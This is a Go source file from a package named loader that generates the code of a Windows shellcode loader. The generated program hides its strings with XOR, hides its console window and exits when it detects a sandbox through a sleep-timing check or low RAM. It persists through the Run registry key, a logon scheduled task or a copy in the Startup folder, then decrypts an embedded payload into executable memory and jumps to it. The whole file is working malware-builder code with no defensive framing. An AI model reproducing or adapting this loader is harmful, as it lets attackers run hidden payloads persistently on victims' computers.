package loader

import "strconv"

func dkFromKey(key string) byte {
	if key == "" {
		return 0x5A
	}
	k := key[0] ^ 0x3C
	if k == 0 {
		return 0x5A
	}
	return k
}

func xorQuote(s string, k byte) string {
	const hexdigits = "0123456789abcdef"
	out := make([]byte, 0, 2+4*len(s))
	out = append(out, '"')
	for i := 0; i < len(s); i++ {
		x := s[i] ^ k
		out = append(out, '\\', 'x', hexdigits[x>>4], hexdigits[x&0xf])
	}
	out = append(out, '"')
	return string(out)
}

func nameKey(opts Options) byte {
	if opts.NameKey != 0 {
		return opts.NameKey
	}
	return dkFromKey(opts.XORKey)
}

func windowsSource(opts Options) string {
	k := nameKey(opts)
	q := func(s string) string { return xorQuote(s, k) }
	return `package main

import (
	_ "embed"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"syscall"
	"unsafe"
)

func jump(code, stack uintptr)

//go:embed cfg.dat
var blob []byte

//go:embed n.bin
var noise []byte

var xorKey = []byte(` + strconv.Quote(combinedXORKey(opts)) + `)

const (
	persistMethod = ` + strconv.Quote(opts.Persistence) + `
	persistName   = ` + strconv.Quote(opts.PersistName) + `
	hideConsole   = ` + strconv.FormatBool(opts.HideConsole) + `
	dk            = byte(` + strconv.Itoa(int(k)) + `)
)

func ds(enc string) string {
	b := make([]byte, len(enc))
	for i := 0; i < len(enc); i++ {
		b[i] = enc[i] ^ dk
	}
	return string(b)
}

func xor(buf, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= key[i%len(key)]
	}
}

func hideWindow() {
	if !hideConsole {
		return
	}
	k32 := syscall.NewLazyDLL(ds(` + q("kernel32.dll") + `))
	u32 := syscall.NewLazyDLL(ds(` + q("user32.dll") + `))
	hwnd, _, _ := k32.NewProc(ds(` + q("GetConsoleWindow") + `)).Call()
	if hwnd != 0 {
		u32.NewProc(ds(` + q("ShowWindow") + `)).Call(hwnd, 0)
	}
	k32.NewProc(ds(` + q("FreeConsole") + `)).Call()
}

func labFast() bool {
	return os.Getenv("SLIV_BG") == "1"
}

func pause() {
	if labFast() {
		return
	}
	k32 := syscall.NewLazyDLL(ds(` + q("kernel32.dll") + `))
	tick := k32.NewProc(ds(` + q("GetTickCount") + `))
	sleep := k32.NewProc(ds(` + q("Sleep") + `))
	t0, _, _ := tick.Call()
	sleep.Call(1800)
	t1, _, _ := tick.Call()
	if t1 >= t0 && t1-t0 < 1400 {
		os.Exit(0)
	}
}

func enoughRAM() bool {
	if labFast() {
		return true
	}
	k32 := syscall.NewLazyDLL(ds(` + q("kernel32.dll") + `))
	fn := k32.NewProc(ds(` + q("GlobalMemoryStatusEx") + `))
	var mem [64]byte
	*(*uint32)(unsafe.Pointer(&mem[0])) = 64
	r, _, _ := fn.Call(uintptr(unsafe.Pointer(&mem[0])))
	if r == 0 {
		return true
	}
	total := *(*uint64)(unsafe.Pointer(&mem[8]))
	return total >= 1<<30
}

func persist() {
	if persistMethod == "" || persistMethod == "off" {
		return
	}
	self, err := os.Executable()
	if err != nil || self == "" {
		return
	}
	if persistMethod == "runkey_hkcu" || persistMethod == "all" {
		persistRun(self)
	}
	if persistMethod == "schtask_logon" || persistMethod == "all" {
		persistTask(self)
	}
	if persistMethod == "startup_lnk" || persistMethod == "all" {
		persistStartup(self)
	}
}

func persistRun(self string) {
	adv := syscall.NewLazyDLL(ds(` + q("advapi32.dll") + `))
	create := adv.NewProc(ds(` + q("RegCreateKeyExW") + `))
	set := adv.NewProc(ds(` + q("RegSetValueExW") + `))
	cls := adv.NewProc(ds(` + q("RegCloseKey") + `))
	sub, err := syscall.UTF16PtrFromString(ds(` + q(`Software\Microsoft\Windows\CurrentVersion\Run`) + `))
	if err != nil {
		return
	}
	var h uintptr
	r, _, _ := create.Call(0x80000001, uintptr(unsafe.Pointer(sub)), 0, 0, 0, 0x20006, 0, uintptr(unsafe.Pointer(&h)), 0)
	if r != 0 || h == 0 {
		return
	}
	nameU, err := syscall.UTF16PtrFromString(persistName)
	if err != nil {
		cls.Call(h)
		return
	}
	val, err := syscall.UTF16PtrFromString(self)
	if err != nil {
		cls.Call(h)
		return
	}
	n := uintptr((len(self) + 1) * 2)
	set.Call(h, uintptr(unsafe.Pointer(nameU)), 0, 1, uintptr(unsafe.Pointer(val)), n)
	cls.Call(h)
}

func persistTask(self string) {
	cmd := exec.Command(
		ds(` + q("schtasks") + `),
		ds(` + q("/create") + `),
		ds(` + q("/tn") + `), persistName,
		ds(` + q("/sc") + `), ds(` + q("ONLOGON") + `),
		ds(` + q("/tr") + `), self,
		ds(` + q("/rl") + `), ds(` + q("LIMITED") + `),
		ds(` + q("/f") + `),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
}

func persistStartup(self string) {
	appdata := os.Getenv(ds(` + q("APPDATA") + `))
	if appdata == "" {
		return
	}
	dir := filepath.Join(appdata,
		ds(` + q("Microsoft") + `),
		ds(` + q("Windows") + `),
		ds(` + q("Start Menu") + `),
		ds(` + q("Programs") + `),
		ds(` + q("Startup") + `),
	)
	_ = os.MkdirAll(dir, 0o755)
	dst := filepath.Join(dir, persistName+".exe")
	if dst == self {
		return
	}
	in, err := os.ReadFile(self)
	if err != nil {
		return
	}
	_ = os.WriteFile(dst, in, 0o755)
}

func run() {
	if len(blob) == 0 {
		return
	}
	k32 := syscall.NewLazyDLL(ds(` + q("kernel32.dll") + `))
	va := k32.NewProc(ds(` + q("VirtualAlloc") + `))
	vp := k32.NewProc(ds(` + q("VirtualProtect") + `))
	flush := k32.NewProc(ds(` + q("FlushInstructionCache") + `))
	n := uintptr(len(blob))
	page := uintptr(0x1000)
	reg := (n + page - 1) &^ (page - 1)
	if reg == 0 {
		return
	}
	memCommit := uintptr(0x1000)
	memReserve := uintptr(0x2000)
	noAccess := uintptr(1)
	pageRW := uintptr(4)
	rwx := uintptr(1 << 6)
	addr, _, _ := va.Call(0, reg, memReserve, noAccess)
	if addr == 0 {
		addr, _, _ = va.Call(0, reg, memCommit|memReserve, pageRW)
		if addr == 0 {
			return
		}
	} else if cmt, _, _ := va.Call(addr, reg, memCommit, pageRW); cmt == 0 {
		var old uint32
		if r, _, _ := vp.Call(addr, reg, pageRW, uintptr(unsafe.Pointer(&old))); r == 0 {
			return
		}
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), int(n))
	const chunk = 0x1000
	for off := 0; off < len(blob); off += chunk {
		end := off + chunk
		if end > len(blob) {
			end = len(blob)
		}
		copy(dst[off:end], blob[off:end])
	}
	xor(dst, xorKey)
	var old uint32
	if r, _, _ := vp.Call(addr, n, rwx, uintptr(unsafe.Pointer(&old))); r == 0 {
		return
	}
	flush.Call(^uintptr(0), addr, n)
	stackSize := uintptr(8 << 20)
	st, _, _ := va.Call(0, stackSize, memCommit|memReserve, pageRW)
	if st == 0 {
		return
	}
	stk := st + stackSize - 256
	stk &^= 15
	runtime.LockOSThread()
	debug.SetGCPercent(-1)
	jump(addr, stk)
	runtime.KeepAlive(blob)
	runtime.KeepAlive(noise)
}

func main() {
	hideWindow()
	if !enoughRAM() {
		os.Exit(0)
	}
	pause()
	persist()
	run()
}
`
}
